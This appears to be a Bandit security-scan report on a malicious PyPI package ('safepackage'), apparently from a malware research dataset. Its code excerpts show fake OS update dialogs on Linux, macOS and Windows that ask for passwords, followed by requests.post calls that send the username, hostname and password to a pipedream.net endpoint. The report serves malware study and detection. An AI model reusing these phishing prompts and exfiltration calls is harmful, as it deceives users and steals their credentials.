Run started:2025-04-13 09:18:54.523082

Test results:
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:4
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
3	def get_os():
4	    OS = platform.system()
5	    if OS.lower() == "linux":

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:4
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
3	def get_os():
4	    OS = platform.system()
5	    if OS.lower() == "linux":

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:4
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
3	def get_os():
4	    OS = platform.system()
5	    if OS.lower() == "linux":

--------------------------------------------------
>> Issue: [B829:getuser] getpass.getuser
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:19
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b829_getuser.html
18	        if CHECK == "meow":
19	            if getpass.getuser().lower() != "root":
20	                if shutil.which("zenity"):

--------------------------------------------------
>> Issue: [B329:blacklist] getpass_getuser
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:19
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b329-getpass-getuser
18	        if CHECK == "meow":
19	            if getpass.getuser().lower() != "root":
20	                if shutil.which("zenity"):

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:21
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
20	                if shutil.which("zenity"):
21	                    passwd = os.popen('zenity --password --text "Mandatory Updates Required. Authentication Required." --title "Software Updates"').read()
22	                    return passwd

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:21
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
20	                if shutil.which("zenity"):
21	                    passwd = os.popen('zenity --password --text "Mandatory Updates Required. Authentication Required." --title "Software Updates"').read()
22	                    return passwd

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:24
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
23	                else:
24	                    os.popen("echo 'PWNED!!' > $HOME/.pwned.txt")
25	            else:

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:26
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
25	            else:
26	                os.popen("echo 'Why Running as Root :(' > /opt/pwned.txt")
27	        elif CHECK == "meow2":

--------------------------------------------------
>> Issue: [B829:getuser] getpass.getuser
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:28
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b829_getuser.html
27	        elif CHECK == "meow2":
28	            if getpass.getuser().lower() != "root":
29	                if shutil.which("osascript"):

--------------------------------------------------
>> Issue: [B329:blacklist] getpass_getuser
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:28
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b329-getpass-getuser
27	        elif CHECK == "meow2":
28	            if getpass.getuser().lower() != "root":
29	                if shutil.which("osascript"):

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:31
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
30	                    cmd= """osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon stop with hidden answer' """
31	                    passwd = os.popen(cmd).read()
32	                    return passwd                

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:31
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
30	                    cmd= """osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon stop with hidden answer' """
31	                    passwd = os.popen(cmd).read()
32	                    return passwd                

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:34
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
33	                else:
34	                    os.popen("echo 'PWNED!!' > $HOME/.pwned.txt")
35	            else:

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:36
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
35	            else:
36	                os.popen("echo 'Why Running as Root :(' > /opt/pwned.txt")
37	        elif CHECK == "i_hate_windows":

--------------------------------------------------
>> Issue: [B829:getuser] getpass.getuser
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:38
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b829_getuser.html
37	        elif CHECK == "i_hate_windows":
38	            if getpass.getuser().lower() != "administrator":
39	                passwd = os.popen("""powershell.exe -ep bypass -c "$cred = Get-Credential -UserName $env:USERNAME -Message 'Administrator Access Required'"; [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($cred.Password))""").read()

--------------------------------------------------
>> Issue: [B329:blacklist] getpass_getuser
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:38
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b329-getpass-getuser
37	        elif CHECK == "i_hate_windows":
38	            if getpass.getuser().lower() != "administrator":
39	                passwd = os.popen("""powershell.exe -ep bypass -c "$cred = Get-Credential -UserName $env:USERNAME -Message 'Administrator Access Required'"; [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($cred.Password))""").read()

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:39
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
38	            if getpass.getuser().lower() != "administrator":
39	                passwd = os.popen("""powershell.exe -ep bypass -c "$cred = Get-Credential -UserName $env:USERNAME -Message 'Administrator Access Required'"; [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($cred.Password))""").read()
40	                return passwd

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:39
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
38	            if getpass.getuser().lower() != "administrator":
39	                passwd = os.popen("""powershell.exe -ep bypass -c "$cred = Get-Credential -UserName $env:USERNAME -Message 'Administrator Access Required'"; [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($cred.Password))""").read()
40	                return passwd

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:42
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
41	            else:
42	                os.popen("powershell -c \"echo 'Why Running as Administrator :(' > C:\\Users\\$env:USERNAME\\pwned.txt\"")
43	        else:

--------------------------------------------------
>> Issue: [B829:getuser] getpass.getuser
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:49
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b829_getuser.html
48	def exfil():
49	    username = getpass.getuser()
50	    hostname = platform.node()

--------------------------------------------------
>> Issue: [B329:blacklist] getpass_getuser
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:49
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b329-getpass-getuser
48	def exfil():
49	    username = getpass.getuser()
50	    hostname = platform.node()

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:53
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
52	    if passwd:
53	        requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname, "Password": passwd})
54	    else:

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:53
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
52	    if passwd:
53	        requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname, "Password": passwd})
54	    else:

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:55
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
54	    else:
55	        requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname})
56	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/safepackage/Confused.py:55
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
54	    else:
55	        requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname})
56	

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/safepackage-1337.0.3/safepackage-1337.0.3/setup.py:8
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
7	with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
8	    long_description = "\n" + fh.read()
9	

--------------------------------------------------

Code scanned:
	Total lines of code: 83
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 7.0
		High: 20.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 22.0
		High: 5.0
Files skipped (0):
